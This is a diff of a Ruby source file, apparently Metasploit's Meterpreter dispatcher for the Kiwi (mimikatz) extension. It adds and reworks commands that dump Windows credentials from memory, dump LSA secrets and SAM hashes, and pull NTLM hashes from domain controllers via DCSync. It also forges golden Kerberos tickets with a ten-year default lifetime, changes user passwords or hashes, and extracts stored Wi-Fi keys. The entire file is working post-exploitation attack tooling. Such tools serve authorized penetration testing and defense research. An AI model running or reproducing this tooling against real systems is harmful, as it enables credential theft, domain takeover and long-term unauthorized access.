@@ -8,7 +8,7 @@ module Ui
 
 ###
 #
-# Kiwi extension - grabs credentials from windows memory.
+# Kiwi extension - grabs credentials from windows memory (newer OSes).
 #
 # Benjamin DELPY `gentilkiwi`
 # http://blog.gentilkiwi.com/mimikatz
@@ -26,30 +26,33 @@ class Console::CommandDispatcher::Kiwi
   # Name for this dispatcher
   #
   def name
-    "Kiwi"
+    'Kiwi'
   end
 
   #
   # Initializes an instance of the priv command interaction. This function
   # also outputs a banner which gives proper acknowledgement to the original
-  # author of the Mimikatz 2.0 software.
+  # author of the Mimikatz software.
   #
   def initialize(shell)
     super
     print_line
-    print_line
-    print_line("  .#####.   mimikatz 2.0 alpha (#{client.platform}) release \"Kiwi en C\"")
-    print_line(" .## ^ ##.")
-    print_line(" ## / \\ ##  /* * *")
-    print_line(" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
-    print_line(" '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)")
-    print_line("  '#####'    Ported to Metasploit by OJ Reeves `TheColonial` * * */")
+    print_line("  .#####.   mimikatz 2.1.1 20180925 (#{client.session_type})")
+    print_line(" .## ^ ##.  \"A La Vie, A L'Amour\"")
+    print_line(" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
+    print_line(" ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz")
+    print_line(" '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )")
+    print_line("  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/")
     print_line
 
-    if (client.platform =~ /x86/) and (client.sys.config.sysinfo['Architecture'] =~ /x64/)
-
+    si = client.sys.config.sysinfo
+    if client.arch == ARCH_X86 && si['Architecture'] == ARCH_X64
+      print_warning('Loaded x86 Kiwi on an x64 architecture.')
       print_line
-      print_warning "Loaded x86 Kiwi on an x64 architecture."
+    end
+
+    if si['OS'] =~ /Windows (NT|XP|2000|2003|\.NET)/i
+      print_warning("Loaded Kiwi on an old OS (#{si['OS']}). Did you mean to 'load mimikatz' instead?")
     end
   end
 
@@ -58,83 +61,172 @@ class Console::CommandDispatcher::Kiwi
   #
   def commands
     {
-      "creds_wdigest"         => "Retrieve WDigest creds",
-      "creds_msv"             => "Retrieve LM/NTLM creds (hashes)",
-      "creds_livessp"         => "Retrieve LiveSSP creds",
-      "creds_ssp"             => "Retrieve SSP creds",
-      "creds_tspkg"           => "Retrieve TsPkg creds",
-      "creds_kerberos"        => "Retrieve Kerberos creds",
-      "creds_all"             => "Retrieve all credentials",
-      "golden_ticket_create"  => "Create a golden kerberos ticket",
-      "kerberos_ticket_use"   => "Use a kerberos ticket",
-      "kerberos_ticket_purge" => "Purge any in-use kerberos tickets",
-      "kerberos_ticket_list"  => "List all kerberos tickets",
-      "lsa_dump"              => "Dump LSA secrets",
-      "wifi_list"             => "List wifi profiles/creds"
+      'kiwi_cmd'              => 'Execute an arbitary mimikatz command (unparsed)',
+      'dcsync'                => 'Retrieve user account information via DCSync (unparsed)',
+      'dcsync_ntlm'           => 'Retrieve user account NTLM hash, SID and RID via DCSync',
+      'creds_wdigest'         => 'Retrieve WDigest creds (parsed)',
+      'creds_msv'             => 'Retrieve LM/NTLM creds (parsed)',
+      'creds_ssp'             => 'Retrieve SSP creds',
+      'creds_tspkg'           => 'Retrieve TsPkg creds (parsed)',
+      'creds_kerberos'        => 'Retrieve Kerberos creds (parsed)',
+      'creds_all'             => 'Retrieve all credentials (parsed)',
+      'golden_ticket_create'  => 'Create a golden kerberos ticket',
+      'kerberos_ticket_use'   => 'Use a kerberos ticket',
+      'kerberos_ticket_purge' => 'Purge any in-use kerberos tickets',
+      'kerberos_ticket_list'  => 'List all kerberos tickets (unparsed)',
+      'lsa_dump_secrets'      => 'Dump LSA secrets (unparsed)',
+      'lsa_dump_sam'          => 'Dump LSA SAM (unparsed)',
+      'password_change'       => 'Change the password/hash of a user',
+      'wifi_list'             => 'List wifi profiles/creds for the current user',
+      'wifi_list_shared'      => 'List shared wifi profiles/creds (requires SYSTEM)',
     }
+  end
+
+  def cmd_kiwi_cmd(*args)
+    output = client.kiwi.exec_cmd(args.join(' '))
+    print_line(output)
+  end
+
+  #
+  # Valid options for the password change feature
+  #
+  @@password_change_usage_opts = Rex::Parser::Arguments.new(
+    '-h' => [false, 'Help banner'],
+    '-u' => [true,  'User name of the password to change.'],
+    '-s' => [true,  'Server to perform the action on (eg. Domain Controller).'],
+    '-p' => [true,  'The known existing/old password (do not use with -n).'],
+    '-n' => [true,  'The known existing/old hash (do not use with -p).'],
+    '-P' => [true,  'The new password to set for the account (do not use with -N).'],
+    '-N' => [true,  'The new hash to set for the account (do not use with -P).']
+  )
+
+  def cmd_password_change_usage
+    print_line('Usage password_change [options]')
+    print_line
+    print_line(@@password_change_usage_opts.usage)
+  end
+
+  def cmd_password_change(*args)
+    if args.length == 0 || args.include?('-h')
+      cmd_password_change_usage
+      return
+    end
+
+    opts = {}
+
+    @@password_change_usage_opts.parse(args) { |opt, idx, val|
+      case opt
+      when '-u'
+        opts[:user] = val
+      when '-s'
+        opts[:server] = val
+      when '-p'
+        opts[:old_pass] = val
+      when '-n'
+        opts[:old_hash] = val
+      when '-P'
+        opts[:new_pass] = val
+      when '-N'
+        opts[:new_hash] = val
+      end
+    }
+
+    valid = true
+    if opts[:old_pass] && opts[:old_hash]
+      print_error('Options -p and -n cannot be used together.')
+      valid = false
+    end
+
+    if opts[:new_pass] && opts[:new_hash]
+      print_error('Options -P and -N cannot be used together.')
+      valid = false
+    end
+
+    unless opts[:old_pass] || opts[:old_hash]
+      print_error('At least one of -p and -n must be specified.')
+      valid = false
+    end
+
+    unless opts[:new_pass] || opts[:new_hash]
+      print_error('At least one of -P and -N must be specified.')
+      valid = false
+    end
+
+    unless opts[:user]
+      print_error('The -u parameter must be specified.')
+      valid = false
+    end
+
+    if valid
+
+      unless opts[:server]
+        print_status('No server (-s) specified, defaulting to localhost.')
+      end
+
+      result = client.kiwi.password_change(opts)
+
+      if result[:success] == true
+        print_good("Success! New NTLM hash: #{result[:new]}")
+      else
+        print_error("Failed! #{result[:error]}")
+      end
+    end
+  end
+
+  def cmd_dcsync(*args)
+    return unless check_is_domain_user
+
+    if args.length != 1
+      print_line('Usage: dcsync <DOMAIN\user>')
+      print_line
+      return
+    end
+
+    print_line(client.kiwi.dcsync(args[0]))
+  end
+
+  def cmd_dcsync_ntlm(*args)
+    return unless check_is_domain_user
+
+    if args.length != 1
+      print_line('Usage: dcsync_ntlm <DOMAIN\user>')
+      print_line
+      return
+    end
+
+    user = args[0]
+    result = client.kiwi.dcsync_ntlm(user)
+    if result
+      print_good("Account   : #{user}")
+      print_good("NTLM Hash : #{result[:ntlm]}")
+      print_good("LM Hash   : #{result[:lm]}")
+      print_good("SID       : #{result[:sid]}")
+      print_good("RID       : #{result[:rid]}")
+    else
+      print_error("Failed to retrieve information for #{user}")
+    end
+    print_line
   end
 
   #
   # Invoke the LSA secret dump on thet target.
   #
-  def cmd_lsa_dump(*args)
-    check_privs
+  def cmd_lsa_dump_secrets(*args)
+    return unless check_is_system
 
-    print_status("Dumping LSA secrets")
-    lsa = client.kiwi.lsa_dump
-
-    # the format of this data doesn't really lend itself nicely to
-    # use within a table so instead we'll dump in a linear fashion
-
-    print_line("Policy Subsystem : #{lsa[:major]}.#{lsa[:minor]}") if lsa[:major]
-    print_line("Domain/Computer  : #{lsa[:compname]}") if lsa[:compname]
-    print_line("System Key       : #{to_hex(lsa[:syskey])}")
-    print_line("NT5 Key          : #{to_hex(lsa[:nt5key])}")
+    print_status('Dumping LSA secrets')
+    print_line(client.kiwi.lsa_dump_secrets)
     print_line
-    print_line("NT6 Key Count    : #{lsa[:nt6keys].length}")
+  end
 
-    if lsa[:nt6keys].length > 0
-      lsa[:nt6keys].to_enum.with_index(1) do |k, i|
-        print_line
-        index = i.to_s.rjust(2, ' ')
-        print_line("#{index}. ID           : #{Rex::Text::to_guid(k[:id])}")
-        print_line("#{index}. Value        : #{to_hex(k[:value])}")
-      end
-    end
+  #
+  # Invoke the LSA SAM dump on thet target.
+  #
+  def cmd_lsa_dump_sam(*args)
+    return unless check_is_system
 
-    print_line
-    print_line("Secret Count     : #{lsa[:secrets].length}")
-    if lsa[:secrets].length > 0
-      lsa[:secrets].to_enum.with_index(1) do |s, i|
-        print_line
-        index = i.to_s.rjust(2, ' ')
-        print_line("#{index}. Name         : #{s[:name]}")
-        print_line("#{index}. Service      : #{s[:service]}") if s[:service]
-        print_line("#{index}. NTLM         : #{to_hex(s[:ntlm])}") if s[:ntlm]
-        if s[:current] || s[:current_raw]
-          current = s[:current] || to_hex(s[:current_raw], ' ')
-          print_line("#{index}. Current      : #{current}")
-        end
-        if s[:old] || s[:old_raw]
-          old = s[:old] || to_hex(s[:old_raw], ' ')
-          print_line("#{index}. Old          : #{old}")
-        end
-      end
-    end
-
-    print_line
-    print_line("SAM Key Count    : #{lsa[:samkeys].length}")
-    if lsa[:samkeys].length > 0
-      lsa[:samkeys].to_enum.with_index(1) do |s, i|
-        print_line
-        index = i.to_s.rjust(2, ' ')
-        print_line("#{index}. RID          : #{s[:rid]}")
-        print_line("#{index}. User         : #{s[:user]}")
-        print_line("#{index}. LM Hash      : #{to_hex(s[:lm_hash])}")
-        print_line("#{index}. NTLM Hash    : #{to_hex(s[:ntlm_hash])}")
-      end
-    end
-
+    print_status('Dumping SAM')
+    print_line(client.kiwi.lsa_dump_sam)
     print_line
   end
 
@@ -142,162 +234,137 @@ class Console::CommandDispatcher::Kiwi
   # Valid options for the golden ticket creation functionality.
   #
   @@golden_ticket_create_opts = Rex::Parser::Arguments.new(
-    "-h" => [ false, "Help banner" ],
-    "-u" => [ true,  "Name of the user to create the ticket for" ],
-    "-i" => [ true,  "ID of the user to associate the ticket with" ],
-    "-g" => [ true,  "Comma-separated list of group identifiers to include (eg: 501,502)" ],
-    "-d" => [ true,  "Name of the target domain (FQDN)" ],
-    "-k" => [ true,  "krbtgt domain user NTLM hash" ],
-    "-t" => [ true,  "Local path of the file to store the ticket in" ],
-    "-s" => [ true,  "SID of the domain" ]
+    '-h' => [ false, 'Help banner' ],
+    '-u' => [ true,  'Name of the user to create the ticket for (required)' ],
+    '-i' => [ true,  'ID of the user to associate the ticket with' ],
+    '-g' => [ true,  'Comma-separated list of group identifiers to include (eg: 501,502)' ],
+    '-d' => [ true,  'FQDN of the target domain (required)' ],
+    '-k' => [ true,  'krbtgt domain user NTLM hash' ],
+    '-t' => [ true,  'Local path of the file to store the ticket in (required)' ],
+    '-s' => [ true,  'SID of the domain' ],
+    '-e' => [ true,  'End in ... Duration in hours (ex: -e 10 for 10 hours), default 10 YEARS']
   )
 
   #
   # Output the usage for the ticket listing functionality.
   #
   def golden_ticket_create_usage
-    print(
-      "\nUsage: golden_ticket_create [-h] -u <user> -d <domain> -k <krbtgt_ntlm> -s <sid> -t <path> [-i <id>] [-g <groups>]\n\n" +
-      "Create a golden kerberos ticket that expires in 10 years time.\n\n" +
-      @@golden_ticket_create_opts.usage)
+    print_line('Usage: golden_ticket_create [options]')
+    print_line
+    print_line('Create a golden kerberos ticket that expires in 10 years time.')
+    print_line(@@golden_ticket_create_opts.usage)
   end
 
   #
   # Invoke the golden kerberos ticket creation functionality on the target.
   #
   def cmd_golden_ticket_create(*args)
+
     if args.include?("-h")
       golden_ticket_create_usage
       return
     end
 
-    user = nil
-    domain = nil
-    sid = nil
-    tgt = nil
-    target = nil
-    id = 0
-    group_ids = []
+    target_file = nil
+    opts = {
+      user: nil,
+      domain_name: nil,
+      domain_sid: nil,
+      krbtgt_hash: nil,
+      user_id: nil,
+      group_ids: nil,
+      end_in: 87608
+    }
 
     @@golden_ticket_create_opts.parse(args) { |opt, idx, val|
       case opt
-      when "-u"
-        user = val
-      when "-d"
-        domain = val
-      when "-k"
-        tgt = val
-      when "-t"
-        target = val
-      when "-i"
-        id = val.to_i
-      when "-g"
-        group_ids = val.split(',').map { |g| g.to_i }.to_a
-      when "-s"
-        sid = val
+      when '-u'
+        opts[:user] = val
+      when '-d'
+        opts[:domain_name] = val
+      when '-k'
+        opts[:krbtgt_hash] = val
+      when '-t'
+        target_file = val
+      when '-i'
+        opts[:user_id] = val.to_i
+      when '-g'
+        opts[:group_ids] = val
+      when '-s'
+        opts[:domain_sid] = val
+      when '-e'
+        opts[:end_in] = val.to_i
       end
     }
 
-    # all parameters are required
-    unless user && domain && sid && tgt && target
+    # we need the user and domain at the very least
+    unless opts[:user] && opts[:domain_name] && target_file
       golden_ticket_create_usage
       return
     end
 
-    ticket = client.kiwi.golden_ticket_create(user, domain, sid, tgt, id, group_ids)
+    # is anything else missing?
+    unless opts[:domain_sid] && opts[:krbtgt_hash]
+      return unless check_is_domain_user('Unable to run module as SYSTEM unless krbtgt and domain sid are provided')
 
-    ::File.open( target, 'wb' ) do |f|
-      f.write ticket
+      # let's go discover it
+      krbtgt_username = opts[:user].split('\\')[0] + '\\krbtgt'
+      dcsync_result = client.kiwi.dcsync_ntlm(krbtgt_username)
+      unless opts[:krbtgt_hash]
+        opts[:krbtgt_hash] = dcsync_result[:ntlm]
+        print_warning("NTLM hash for krbtgt missing, using #{opts[:krbtgt_hash]} extracted from #{krbtgt_username}")
+      end
+
+      unless opts[:domain_sid]
+        domain_sid = dcsync_result[:sid].split('-')
+        opts[:domain_sid] = domain_sid[0, domain_sid.length - 1].join('-')
+        print_warning("Domain SID missing, using #{opts[:domain_sid]} extracted from SID of #{krbtgt_username}")
+      end
     end
 
-    print_good("Golden Kerberos ticket written to #{target}")
+    ticket = client.kiwi.golden_ticket_create(opts)
+
+    ::File.open(target_file, 'wb') do |f|
+      f.write(ticket)
+    end
+
+    print_good("Golden Kerberos ticket written to #{target_file}")
   end
 
   #
   # Valid options for the ticket listing functionality.
   #
   @@kerberos_ticket_list_opts = Rex::Parser::Arguments.new(
-    "-h" => [ false, "Help banner" ],
-    "-e" => [ false, "Export Kerberos tickets to disk" ],
-    "-p" => [ true,  "Path to export Kerberos tickets to" ]
+    '-h' => [ false, 'Help banner' ],
   )
 
   #
   # Output the usage for the ticket listing functionality.
   #
   def kerberos_ticket_list_usage
-    print(
-      "\nUsage: kerberos_ticket_list [-h] [-e <true|false>] [-p <path>]\n\n" +
-      "List all the available Kerberos tickets.\n\n" +
-      @@kerberos_ticket_list_opts.usage)
+    print_line('Usage: kerberos_ticket_list [options]')
+    print_line
+    print_line('List all the available Kerberos tickets.')
+    print_line(@@kerberos_ticket_list_opts.usage)
   end
 
   #
   # Invoke the kerberos ticket listing functionality on the target machine.
   #
   def cmd_kerberos_ticket_list(*args)
-    if args.include?("-h")
+    if args.include?('-h')
       kerberos_ticket_list_usage
       return
     end
 
-    # default to not exporting
-    export = false
-    # default to the current folder for dumping tickets
-    export_path = "."
-
-    @@kerberos_ticket_list_opts.parse(args) { |opt, idx, val|
-      case opt
-      when "-e"
-        export = true
-      when "-p"
-        export_path = val
-      end
-    }
-
-    tickets = client.kiwi.kerberos_ticket_list(export)
-
-    fields = ['Server', 'Client', 'Start', 'End', 'Max Renew', 'Flags']
-    fields << 'Export Path' if export
-
-    table = Rex::Ui::Text::Table.new(
-      'Header'    => "Kerberos Tickets",
-      'Indent'    => 0,
-      'SortIndex' => 0,
-      'Columns'   => fields
-    )
-
-    tickets.each do |t|
-      flag_list = client.kiwi.to_kerberos_flag_list(t[:flags]).join(", ")
-      values = [
-        "#{t[:server]} @ #{t[:server_realm]}",
-        "#{t[:client]} @ #{t[:client_realm]}",
-        t[:start],
-        t[:end],
-        t[:max_renew],
-        "#{t[:flags].to_s(16).rjust(8, '0')} (#{flag_list})"
-      ]
-
-      # write out each ticket to disk if export is enabled.
-      if export
-        path = "<no data retrieved>"
-        if t[:raw]
-          id = "#{values[0]}-#{values[1]}".gsub(/[\\\/\$ ]/, '-')
-          file = "kerb-#{id}-#{Rex::Text.rand_text_alpha(8)}.tkt"
-          path = ::File.expand_path(File.join(export_path, file))
-          ::File.open(path, 'wb') do |x|
-            x.write t[:raw]
-          end
-        end
-        values << path
-      end
-
-      table << values
+    output = client.kiwi.kerberos_ticket_list.strip
+    if output == ''
+      print_error('No kerberos tickets exist in the current session.')
+    else
+      print_good('Kerberos tickets found in the current session.')
+      print_line(output)
     end
-
     print_line
-    print_line(table.to_s)
-    print_line("Total Tickets : #{tickets.length}")
   end
 
   #
@@ -305,7 +372,7 @@ class Console::CommandDispatcher::Kiwi
   #
   def cmd_kerberos_ticket_purge(*args)
     client.kiwi.kerberos_ticket_purge
-    print_good("Kerberos tickets purged")
+    print_good('Kerberos tickets purged')
   end
 
   #
@@ -313,7 +380,7 @@ class Console::CommandDispatcher::Kiwi
   #
   def cmd_kerberos_ticket_use(*args)
     if args.length != 1
-      print_line("Usage: kerberos_ticket_use ticketpath")
+      print_line('Usage: kerberos_ticket_use ticketpath')
       return
     end
 
@@ -323,130 +390,166 @@ class Console::CommandDispatcher::Kiwi
       ticket += f.read(f.stat.size)
     end
 
-    print_status("Using Kerberos ticket stored in #{target}, #{ticket.length} bytes")
-    client.kiwi.kerberos_ticket_use(ticket)
-    print_good("Kerberos ticket applied successfully")
-  end
-
-  def wifi_list_usage
-    print(
-      "\nUsage: wifi_list\n\n" +
-      "List WiFi interfaces, profiles and passwords.\n\n")
+    print_status("Using Kerberos ticket stored in #{target}, #{ticket.length} bytes ...")
+    if client.kiwi.kerberos_ticket_use(ticket)
+      print_good('Kerberos ticket applied successfully.')
+    else
+      print_error('Kerberos ticket application failed.')
+    end
   end
 
   #
-  # Dump all the wifi profiles/credentials
+  # Dump all the shared wifi profiles/credentials
+  #
+  def cmd_wifi_list_shared(*args)
+    interfaces_dir = client.sys.config.getenv('AllUsersProfile') + '\Microsoft\Wlansvc\Profiles\Interfaces'
+    files = client.fs.file.search(interfaces_dir, '*.xml', true)
+
+    if files.length == 0
+      print_error('No shared WiFi profiles found.')
+    else
+      interfaces = {}
+      files.each do |f|
+        interface_guid = f['path'].split("\\")[-1]
+        full_path = "#{f['path']}\\#{f['name']}"
+
+        interfaces[interface_guid] ||= []
+        interfaces[interface_guid] << full_path
+      end
+      results = client.kiwi.wifi_parse_shared(interfaces)
+
+      if results.length > 0
+        display_wifi_profiles(results)
+      else
+        print_line
+        print_error('No shared wireless profiles found on the target.')
+      end
+    end
+
+    true
+  end
+
+  #
+  # Dump all the wifi profiles/credentials for the current user
   #
   def cmd_wifi_list(*args)
-    # if any arguments are specified, then fire up a usage message
-    if args.length > 0
-      wifi_list_usage
-      return
-    end
-
     results = client.kiwi.wifi_list
-
     if results.length > 0
-      results.each do |r|
-        table = Rex::Ui::Text::Table.new(
-          'Header'    => "#{r[:desc]} - #{r[:guid]}",
-          'Indent'    => 0,
-          'SortIndex' => 0,
-          'Columns'   => [
-            'Name', 'Auth', 'Type', 'Shared Key'
-          ]
-        )
-
-        print_line
-        r[:profiles].each do |p|
-          table << [p[:name], p[:auth], p[:key_type], p[:shared_key]]
-        end
-
-        print_line table.to_s
-        print_line "State: #{r[:state]}"
-      end
+      display_wifi_profiles(results)
     else
       print_line
-      print_error("No wireless profiles found on the target.")
+      print_error('No wireless profiles found on the target.')
     end
 
+    true
+  end
+
+  @@creds_opts = Rex::Parser::Arguments.new(
+    '-o' => [ true,  'Write the output to the specified file.' ],
+    '-h' => [ false, 'Help menu.' ]
+  )
+
+  #
+  # Displays information about the various creds commands
+  #
+  def cmd_creds_usage(provider)
+    print_line("Usage: creds_#{provider} [options]")
     print_line
-    return true
+    print_line("Dump #{provider} credentials.")
+    print_line(@@creds_opts.usage)
   end
 
   #
   # Dump all the possible credentials to screen.
   #
   def cmd_creds_all(*args)
-    method = Proc.new { client.kiwi.all_pass }
-    scrape_passwords("all", method)
+    method = Proc.new { client.kiwi.creds_all }
+    scrape_passwords('all', method, args)
   end
 
   #
   # Dump all wdigest credentials to screen.
   #
   def cmd_creds_wdigest(*args)
-    method = Proc.new { client.kiwi.wdigest }
-    scrape_passwords("wdigest", method)
+    method = Proc.new { client.kiwi.creds_wdigest }
+    scrape_passwords('wdigest', method, args)
   end
 
   #
   # Dump all msv credentials to screen.
   #
   def cmd_creds_msv(*args)
-    method = Proc.new { client.kiwi.msv }
-    scrape_passwords("msv", method)
-  end
-
-  #
-  # Dump all LiveSSP credentials to screen.
-  #
-  def cmd_creds_livessp(*args)
-    method = Proc.new { client.kiwi.livessp }
-    scrape_passwords("livessp", method)
+    method = Proc.new { client.kiwi.creds_msv }
+    scrape_passwords('msv', method, args)
   end
 
   #
   # Dump all SSP credentials to screen.
   #
   def cmd_creds_ssp(*args)
-    method = Proc.new { client.kiwi.ssp }
-    scrape_passwords("ssp", method)
+    method = Proc.new { client.kiwi.creds_ssp }
+    scrape_passwords('ssp', method, args)
   end
 
   #
   # Dump all TSPKG credentials to screen.
   #
   def cmd_creds_tspkg(*args)
-    method = Proc.new { client.kiwi.tspkg }
-    scrape_passwords("tspkg", method)
+    method = Proc.new { client.kiwi.creds_tspkg }
+    scrape_passwords('tspkg', method, args)
   end
 
   #
   # Dump all Kerberos credentials to screen.
   #
   def cmd_creds_kerberos(*args)
-    method = Proc.new { client.kiwi.kerberos }
-    scrape_passwords("kerberos", method)
+    method = Proc.new { client.kiwi.creds_kerberos }
+    scrape_passwords('kerberos', method, args)
   end
 
 protected
 
-  def check_privs
-    if system_check
-      print_good("Running as SYSTEM")
-    else
-      print_warning("Not running as SYSTEM, execution may fail")
+  def display_wifi_profiles(profiles)
+    profiles.each do |r|
+      header = r[:guid]
+      header = "#{r[:desc]} - #{header}" if r[:desc]
+      table = Rex::Text::Table.new(
+        'Header'    => header,
+        'Indent'    => 0,
+        'SortIndex' => 0,
+        'Columns'   => [
+          'Name', 'Auth', 'Type', 'Shared Key'
+        ]
+      )
+
+      print_line
+      r[:profiles].each do |p|
+        table << [p[:name], p[:auth], p[:key_type] || 'Unknown', p[:shared_key]]
+      end
+
+      print_line(table.to_s)
+      print_line("State: #{r[:state] || 'Unknown'}")
     end
   end
 
-  def system_check
-    unless (client.sys.config.getuid == "NT AUTHORITY\\SYSTEM")
-      print_warning("Not currently running as SYSTEM")
+
+  def check_is_domain_user(msg='Running as SYSTEM, function will not work.')
+    if client.sys.config.is_system?
+      print_warning(msg)
       return false
     end
 
-    return true
+    true
+  end
+
+  def check_is_system
+    if client.sys.config.is_system?
+      print_good('Running as SYSTEM')
+      return true
+    end
+
+    print_warning('Not running as SYSTEM, execution may fail')
+    false
   end
 
   #
@@ -459,33 +562,79 @@ protected
   #   Meterpreter that lay in the house that Jack built.
   #
   # @return [void]
-  def scrape_passwords(provider, method)
-    check_privs
-    print_status("Retrieving #{provider} credentials")
-    accounts = method.call
-
-    table = Rex::Ui::Text::Table.new(
-      'Header'    => "#{provider} credentials",
-      'Indent'    => 0,
-      'SortIndex' => 0,
-      'Columns'   =>
-      [
-        'Domain', 'User', 'Password', 'Auth Id', 'LM Hash', 'NTLM Hash'
-      ]
-    )
-
-    accounts.each do |acc|
-      table << [
-        acc[:domain] || "",
-        acc[:username] || "",
-        acc[:password] || "",
-        "#{acc[:auth_hi]} ; #{acc[:auth_lo]}",
-        to_hex(acc[:lm] || ""),
-        to_hex(acc[:ntlm] || "")
-      ]
+  def scrape_passwords(provider, method, args)
+    if args.include?('-h')
+      cmd_creds_usage(provider)
+      return
     end
 
-    print_line table.to_s
+    return unless check_is_system
+    print_status("Retrieving #{provider} credentials")
+    accounts = method.call
+    output = ""
+
+    accounts.keys.each do |k|
+      next if accounts[k].length == 0
+
+      # Keep track of the columns that we were given, in
+      # the order we are given them, while removing duplicates
+      columns = []
+      existing = Set.new
+      accounts[k].each do |acct|
+        acct.keys.each do |k|
+          unless existing.include?(k)
+            columns << k
+            existing.add(k)
+          end
+        end
+      end
+
+      table = Rex::Text::Table.new(
+        'Header'    => "#{k} credentials",
+        'Indent'    => 0,
+        'SortIndex' => 0,
+        'Columns'   => columns
+      )
+
+      accounts[k].each do |acct|
+        values = []
+        # Iterate through the given columns and match the values up
+        # correctly based on the index of the column header.
+        columns.each do |c|
+          col_idx = acct.keys.index(c)
+          # If the column exists, we'll use the value that is associated
+          # with the column based on its index
+          if col_idx
+            values << acct.values[col_idx]
+          else
+            # Otherwise, just add a blank value
+            values << ''
+          end
+        end
+        table << values
+      end
+
+      output << table.to_s + "\n"
+    end
+
+    print_line(output)
+
+    # determine if a target file path was passed in
+    file_index = args.index('-o')
+    unless file_index.nil?
+      if args.length > file_index + 1
+        # try to write the file to disk
+        begin
+          ::File.write(args[file_index + 1], output)
+          print_good("Output written to #{args[file_index + 1]}")
+        rescue
+          print_error("Unable to write to #{args[file_index + 1]}")
+        end
+      else
+        print_error('Missing file path for -o parameter')
+      end
+    end
+
     return true
   end
 
@@ -496,8 +645,7 @@ protected
   # @param (see Rex::Text.to_hex)
   # @return [String] The result of {Rex::Text.to_hex}, strip'd
   def to_hex(value, sep = '')
-    value ||= ""
-    Rex::Text.to_hex(value, sep).strip
+    Rex::Text.to_hex(value || '', sep).strip
   end
 
 end
@@ -506,4 +654,3 @@ end
 end
 end
 end
-
